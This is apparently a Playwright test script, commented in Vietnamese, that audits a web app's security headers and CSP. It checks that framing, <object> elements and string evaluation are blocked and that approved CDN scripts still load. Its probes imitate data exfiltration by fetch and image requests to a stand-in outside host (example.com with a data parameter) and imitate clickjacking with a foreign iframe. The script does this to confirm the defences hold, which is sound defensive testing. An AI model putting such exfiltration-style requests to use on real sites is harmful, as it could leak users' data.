/**
 * Đo header bảo mật + CSP của frontend — trên máy (next start) hoặc production.
 *
 *   node scripts/do_dau_bao_mat.mjs                         # http://localhost:3100
 *   PE_URL=https://pe-hsa.vercel.app node scripts/do_dau_bao_mat.mjs
 *   PE_TOKENS=.the/tokens_ad.json node scripts/do_dau_bao_mat.mjs   # thêm phần cần đăng nhập
 *
 * ── VÌ SAO ĐO CẢ HAI CHIỀU (14/09/2026) ─────────────────────────────────────
 * "0 vi phạm CSP" KHÔNG phân biệt được CSP đang chạy với CSP không tồn tại —
 * trước hôm nay Vercel không gửi CSP nào, và mọi lượt quét vẫn in 0. Nên bộ đo
 * này đòi cả hai:
 *   CHO PHÉP — thứ sản phẩm thật sự dùng vẫn chạy: script confetti từ jsdelivr,
 *              Font Awesome từ cdnjs.
 *   CHẶN     — thứ kẻ tấn công cần thì bị chặn: nhúng trang vào iframe miền lạ,
 *              fetch/ảnh gửi dữ liệu ra máy chủ lạ, `<object>`, và (từ 15/09/2026,
 *              khi đồ thị bài học thôi dùng `new Function`) biên dịch chuỗi thành mã.
 * Gỡ CSP khỏi `next.config.ts` thì phần CHẶN đỏ; siết quá tay thì phần CHO PHÉP đỏ.
 *
 * Chỉ ĐỌC: mọi lời gọi không phải GET tới `/api/` bị chặn tại trình duyệt.
 */
import { createRequire } from 'node:module';
import { readFileSync, existsSync } from 'node:fs';
import { dirname, join } from 'node:path';
import { fileURLToPath } from 'node:url';

const DAY = dirname(fileURLToPath(import.meta.url));
const GOC = (process.env.PE_URL || 'http://localhost:3100').replace(/\/$/, '');
const TOKEN = process.env.PE_TOKENS || '';
const { chromium } = createRequire(join(DAY, '..', 'frontend', 'package.json'))('@playwright/test');

let hong = 0;
const dat = (ok, ten, chiTiet = '') => {
  if (!ok) hong++;
  console.log(`${ok ? '  ĐẠT ' : '  HỎNG'}  ${ten}${chiTiet ? '  — ' + chiTiet : ''}`);
};

/* ── 1. Header trên mọi loại phản hồi: trang, route handler, tệp tĩnh ── */
console.log(`\n[1] Header — ${GOC}`);
const CAN = {
  'content-security-policy': (v) => /frame-ancestors 'none'/.test(v) && /object-src 'none'/.test(v) && /connect-src 'self'/.test(v),
  'x-content-type-options': (v) => v === 'nosniff',
  'x-frame-options': (v) => v === 'DENY',
  'referrer-policy': (v) => v === 'strict-origin-when-cross-origin',
  'permissions-policy': (v) => /camera=\(\)/.test(v) && /microphone=\(\)/.test(v),
  'cross-origin-opener-policy': (v) => v === 'same-origin',
};
for (const duong of ['/', '/login', '/api/user', '/static/js/main.js']) {
  const r = await fetch(GOC + duong, { redirect: 'manual' });
  const thieu = Object.entries(CAN).filter(([k, kiem]) => !kiem(r.headers.get(k) || '')).map(([k]) => k);
  dat(thieu.length === 0, `${duong} (${r.status})`, thieu.length ? 'thiếu/sai: ' + thieu.join(', ') : '');
  dat(!r.headers.get('x-powered-by'), `${duong} không lộ X-Powered-By`, r.headers.get('x-powered-by') || '');
}

/* ── 2. Trình duyệt: CHẶN đúng thứ cần chặn ── */
const b = await chromium.launch();
const c = await b.newContext();
await c.route('**/api/**', (r, req) => (['GET', 'HEAD'].includes(req.method()) ? r.fallback() : r.abort()));
const loiCsp = (p) => {
  const ds = [];
  p.on('console', (m) => { if (m.type() === 'error' && /Content Security Policy/i.test(m.text())) ds.push(m.text()); });
  return ds;
};

console.log('\n[2] CHẶN');
{
  // Trang miền lạ (about:blank + nội dung tự dựng) nhúng trang đăng nhập → phải bị chặn.
  const p = await c.newPage();
  const ds = loiCsp(p);
  await p.setContent(`<iframe id="f" src="${GOC}/login" style="width:600px;height:400px"></iframe>`);
  await p.waitForTimeout(2500);
  const f = p.frames().find((x) => x.url().startsWith(GOC));
  let coNoiDung = false;
  try { coNoiDung = !!f && (await f.evaluate(() => document.body?.innerText?.length || 0)) > 0; } catch { coNoiDung = false; }
  // Đòi CẢ HAI: không dựng được VÀ trình duyệt nói lý do là `frame-ancestors`.
  // Chỉ đòi "không dựng được" thì mạng hỏng hay trang lỗi cũng ra ĐẠT (sửa 15/09/2026).
  const dongKhung = ds.find((x) => x.includes('frame-ancestors'));
  dat(!coNoiDung && !!dongKhung, 'iframe từ miền lạ không hiển thị được trang (chống clickjacking)',
    coNoiDung ? 'trang VẪN dựng trong iframe'
      : dongKhung ? dongKhung.slice(0, 90) : 'không dựng được nhưng KHÔNG có dòng frame-ancestors — lý do khác');
  await p.close();
}
{
  const p = await c.newPage();
  const ds = loiCsp(p);
  await p.goto(GOC + '/login', { waitUntil: 'domcontentloaded' });
  const fetchRa = await p.evaluate(async () => {
    try { await fetch('https://example.com/ro-ri?d=1', { mode: 'no-cors' }); return 'đi được'; } catch { return 'bị chặn'; }
  });
  // Mỗi mục CHẶN đòi một dòng CSP nêu ĐÚNG chỉ thị. "fetch ném lỗi" hay "có một
  // dòng CSP nào đó" thì mất mạng hoặc một vi phạm khác cũng ra ĐẠT (sửa 15/09/2026).
  const coChiThi = (ct) => ds.some((x) => x.includes(ct));
  await p.waitForTimeout(500);
  dat(fetchRa === 'bị chặn' && coChiThi('connect-src'), 'fetch tới máy chủ lạ bị chặn (connect-src)',
    fetchRa + (coChiThi('connect-src') ? '' : ' — không có dòng connect-src'));
  await p.evaluate(() => { const i = new Image(); i.src = 'https://example.com/ro-ri.png?d=1'; document.body.appendChild(i); });
  await p.waitForTimeout(1200);
  dat(coChiThi('img-src'), 'ảnh gửi ra máy chủ lạ bị chặn (img-src)');
  await p.evaluate(() => { const o = document.createElement('object'); o.data = '/favicon.ico'; document.body.appendChild(o); });
  await p.waitForTimeout(800);
  dat(coChiThi('object-src'), '<object> bị chặn (object-src none)');
  // 15/09/2026: đồ thị bài học thôi dùng `new Function` (điểm do máy chủ tính), nên
  // production bỏ 'unsafe-eval'. Chuỗi → mã là thứ một lỗ XSS cần để tải payload.
  //
  // ĐO TỪ SCRIPT CỦA CHÍNH TRANG, không từ `page.evaluate`. Bản đầu gọi `new Function`
  // qua `evaluate` và `addScriptTag` — cả hai đi đường DevTools, và Chromium để mã ấy
  // eval thoải mái dù CSP cấm: đo trên máy (CSP không 'unsafe-eval') vẫn ra "chạy". Thí
  // nghiệm cô lập cùng ngày: trang có `<script>` NẰM SẴN trong HTML thì bị chặn
  // (EvalError) — và KHÔNG in dòng console nào khi lỗi bị bắt, nên cũng không được đòi
  // dòng console. Cách đo: chặn phản hồi `/login`, nhét một `<script>` vào đầu HTML (giữ
  // nguyên header, kể cả CSP), để chính trang thử eval rồi ghi kết quả ra `data-*`.
  const pe = await c.newPage();
  await pe.route(GOC + '/login', async (route) => {
    const r = await route.fetch();
    const html = (await r.text()).replace(/<head[^>]*>/, (m) => m
      + '<script>try{document.documentElement.dataset.evalRa=new Function("return 42")()===42?"chạy được":"lạ"}'
      + 'catch(e){document.documentElement.dataset.evalRa="bị chặn: "+e.name}</script>');
    await route.fulfill({ response: r, body: html });
  });
  await pe.goto(GOC + '/login', { waitUntil: 'domcontentloaded' });
  const evalRa = await pe.evaluate(() => document.documentElement.dataset.evalRa || 'script không chạy');
  const cspTrang = (await pe.evaluate(() => fetch(location.href, { method: 'HEAD' })
    .then((x) => x.headers.get('content-security-policy') || '').catch(() => '')));
  dat(evalRa.startsWith('bị chặn'), "new Function từ script của trang bị chặn (không còn 'unsafe-eval')",
    evalRa + (/unsafe-eval/.test(cspTrang) ? " — CSP đang gửi CÓ 'unsafe-eval'" : ''));
  await pe.close();
  await p.close();
}

/* ── 3. Trình duyệt: CHO PHÉP thứ sản phẩm dùng ── */
console.log('\n[3] CHO PHÉP');
{
  const p = await c.newPage();
  const ds = loiCsp(p);
  await p.goto(GOC + '/login', { waitUntil: 'domcontentloaded' });
  const kq = await p.evaluate(async () => {
    const confetti = await new Promise((ok) => {
      const s = document.createElement('script');
      s.src = 'https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.2/dist/confetti.browser.min.js';
      s.onload = () => ok(typeof window.confetti === 'function');
      s.onerror = () => ok(false);
      document.head.appendChild(s);
    });
    if (confetti) window.confetti({ particleCount: 5, disableForReducedMotion: false });
    const fa = await new Promise((ok) => {
      const l = document.createElement('link');
      l.rel = 'stylesheet';
      l.href = 'https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css';
      l.onload = () => ok(true);
      l.onerror = () => ok(false);
      document.head.appendChild(l);
    });
    return { confetti, fa };
  });
  await p.waitForTimeout(1500);
  dat(kq.confetti, 'script confetti từ cdn.jsdelivr.net nạp được');
  dat(kq.fa, 'Font Awesome từ cdnjs.cloudflare.com nạp được');
  dat(ds.length === 0, 'trang đăng nhập + hai thao tác trên: 0 dòng CSP', (ds[0] || '').slice(0, 120));
  await p.close();
}

/* ── 4. Có thẻ: đi các trang cần đăng nhập, đếm dòng CSP ── */
if (TOKEN && existsSync(TOKEN)) {
  console.log('\n[4] Trang cần đăng nhập');
  const tok = JSON.parse(readFileSync(TOKEN, 'utf8'));
  const host = new URL(GOC).hostname;
  await c.addCookies([{ name: 'pe_at', value: tok.access, domain: host, path: '/', httpOnly: true, sameSite: 'Lax', secure: GOC.startsWith('https') }]);
  // '/mock' bỏ khỏi danh sách 24/09/2026 (bỏ thi, pha A) — đường ấy chỉ còn chuyển hướng.
  for (const duong of ['/dashboard', '/courses/hsa_quantitative', '/lesson/hsa_quantitative?lesson=1', '/quan-tri/tong-quan', '/giao-trinh', '/giang-day/buoi-hoc/1']) {
    const p = await c.newPage();
    const ds = loiCsp(p);
    await p.goto(GOC + duong, { waitUntil: 'domcontentloaded', timeout: 45000 });
    await p.waitForTimeout(3000);
    const bi_day = /login/.test(new URL(p.url()).pathname);
    dat(!bi_day && ds.length === 0, duong, bi_day ? 'bị đẩy về đăng nhập — thẻ hết hạn?' : (ds[0] || '').slice(0, 120));
    await p.close();
  }
}

await b.close();
console.log(hong ? `\n${hong} mục HỎNG` : '\nTất cả ĐẠT');
process.exit(hong ? 1 : 0);
